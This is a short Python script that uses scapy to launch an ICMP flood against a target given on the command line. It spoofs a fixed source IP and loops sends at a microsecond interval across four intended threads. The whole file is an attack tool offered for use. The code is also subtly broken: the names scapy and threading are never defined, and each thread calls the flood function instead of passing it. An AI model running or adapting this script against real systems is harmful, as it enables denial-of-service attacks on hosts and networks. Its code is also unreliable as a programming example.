import sys
from scapy.all import *
from struct import pack

target = str(sys.argv[1])

print("Attacking " + target + " with ICMP flood.")


def icmp_flood():
    packet = scapy.IP(src="192.168.32.110", dst=target) / \
        scapy.ICMP() / "random_payload"
    send(packet, loop=1, inter=0.00001)


t1 = threading.Thread(target=icmp_flood())
t2 = threading.Thread(target=icmp_flood())
t3 = threading.Thread(target=icmp_flood())
t4 = threading.Thread(target=icmp_flood())

t1.start()
t2.start()
t3.start()
t4.start()
